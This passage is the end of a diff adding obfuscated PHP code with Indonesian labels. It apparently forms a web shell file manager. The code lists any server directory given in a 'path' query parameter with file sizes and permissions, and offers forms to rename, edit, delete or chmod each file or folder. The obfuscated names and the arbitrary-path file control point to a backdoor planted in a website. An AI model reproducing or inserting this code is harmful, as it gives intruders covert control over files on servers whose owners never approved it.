+                        echo !empty($lD7Hf) ? $lD7Hf : '';
+                        echo "\t\t\t\r\n\t\t<thead>\t\r\n\t\t<tr>\r\n\t\t\t<th>Nama</th>\r\n\t\t\t<th>Size</th>\r\n\t\t\t<th>Permission</th>\r\n\t\t\t<th>Action</th>\r\n\t\t</tr>\r\n\t\t</thead>\r\n\t\t";
+                        foreach ($Lhf_4 as $tnyU3) {
+                            echo "\t\t<tr>\r\n\t\t\t<td><a style=\"color: black;\" href=\"?path=";
+                            echo str_replace([".", "//"], ["%2e", "/"], $SqtP3 . "/" . $tnyU3);
+                            echo "\">";
+                            echo $tnyU3;
+                            echo "</a></td>\r\n\t\t\t<td style=\"color:red\">";
+                            echo is_file($SqtP3 . "/" . $tnyU3) ? KPHnQ($SqtP3 . "/" . $tnyU3) : "Directory";
+                            echo "</td>\r\n\t\t\t<td>";
+                            echo is_writable($SqtP3 . "/" . $tnyU3) ? "<font color=\"green\">" . @rzQGM($SqtP3 . "/" . $tnyU3) . "</font>" : "<font color=\"red\">" . @RZqgM($SqtP3 . "/" . $tnyU3) . "</font>";
+                            echo "</td>\r\n\t\t\t<td>\r\n\t\t\t\t";
+                            if (is_file($SqtP3 . "/" . $tnyU3)) {
+                                echo "\t\t\t\t<form method=\"POST\" action=\"?set&path=";
+                                echo $SqtP3;
+                                echo "\">\r\n\t\t\t\t\t<center>\r\n\t\t\t\t\t<select class=\"browser-default\" name=\"pilihan\" style=\"height: 30px; width: 100px; z-index: 1;\">\r\n\t\t\t\t\t\t<option value=\"Select\" disabled selected>Select</option>\r\n\t\t\t\t\t\t<option value=\"rename\">Rename</option>\r\n\t\t\t\t\t\t<option value=\"edit\">Edit</option>\r\n\t\t\t\t\t\t<option value=\"delete\">Delete</option>\r\n\t\t\t\t\t\t<option value=\"chmod\">Chmod</option>\r\n\t\t\t\t\t</select>\r\n\t\t\t\t\t</center>\r\n\t\t\t\t\t<input type=\"hidden\" name=\"type\" value=\"file\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"namaFile\" value=\"";
+                                echo $tnyU3;
+                                echo "\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"dir\" value=\"";
+                                echo $SqtP3 . "/" . $tnyU3;
+                                echo "\">\r\n\t\t\t\t\t <button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"action\">\r\n\t\t\t\t\t    <i class=\"material-icons right\">send</i>\r\n\t\t\t\t\t </button>\r\n\t\t\t\t</form>\r\n\t\t\t\t";
+                            } else {
+                                echo "\t\t\t\t<form method=\"POST\" action=\"?set&path=";
+                                echo $SqtP3;
+                                echo "\">\t\r\n\t\t\t\t\t<center>\r\n\t\t\t\t\t<select class=\"browser-default\" name=\"pilihan\" style=\"height: 30px; width: 100px; z-index: 1;\" name=\"pilihan\">\r\n\t\t\t\t\t\t<option value=\"Select\" disabled selected>Select</option>\r\n\t\t\t\t\t\t<option value=\"rename\">Rename</option>\r\n\t\t\t\t\t\t<option value=\"delete\">Delete</option>\r\n\t\t\t\t\t\t<option value=\"chmod\">Chmod</option>\r\n\t\t\t\t\t</select>\r\n\t\t\t\t\t</center>\r\n\t\t\t\t\t<input type=\"hidden\" name=\"type\" value=\"folder\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"namaFile\" value=\"";
+                                echo $tnyU3;
+                                echo "\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"dir\" value=\"";
+                                echo $SqtP3 . "/" . $tnyU3;
+                                echo "\">\r\n\t\t\t\t\t<button class=\"btn waves-effect waves-light\" type=\"submit\" name=\"action\">\r\n\t\t\t\t\t    <i class=\"material-icons right\">send</i>\r\n\t\t\t\t\t</button>\r\n\t\t\t\t</form>\r\n\t\t\t\t";
+                            }
+                            echo "\t\t\t</td>\r\n\t\t</tr>\r\n\t\t";
+                        }
+                        echo "\t</table>\r\n</div>\r\n\t";
+                    }
+                }
+            }
+        }
+    }
+}
+echo "</div>\r\n\r\n\t<footer id=\"footer\" style=\"margin-top: 100px;\">\r\n\r\n\t</footer>\r\n\r\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js\"></script>\r\n<script> \r\n\r\nvar footer = document.querySelector(\"footer\");\r\n\r\nfunction stopScrollAtFooter() {\r\n    var footerHeight = footer.clientHeight;\r\n    var contentHeight = document.body.scrollHeight;\r\n    var scrollY = window.scrollY;\r\n\r\n\tif (scrollY + window.innerHeight >= contentHeight - footerHeight) {\r\n\t\t\twindow.scrollTo(0, contentHeight - window.innerHeight);\r\n\t\t}\r\n\t}\r\n\r\n\twindow.addEventListener(\"scroll\", stopScrollAtFooter);\r\n\r\n\r\n\tdocument.addEventListener('DOMContentLoaded', function() {\r\n    var elems = document.querySelectorAll('select');\r\n    var instances = M.FormSelect.init(elems, {});\r\n  });\r\n</script>\r\n</body>\r\n</html>";
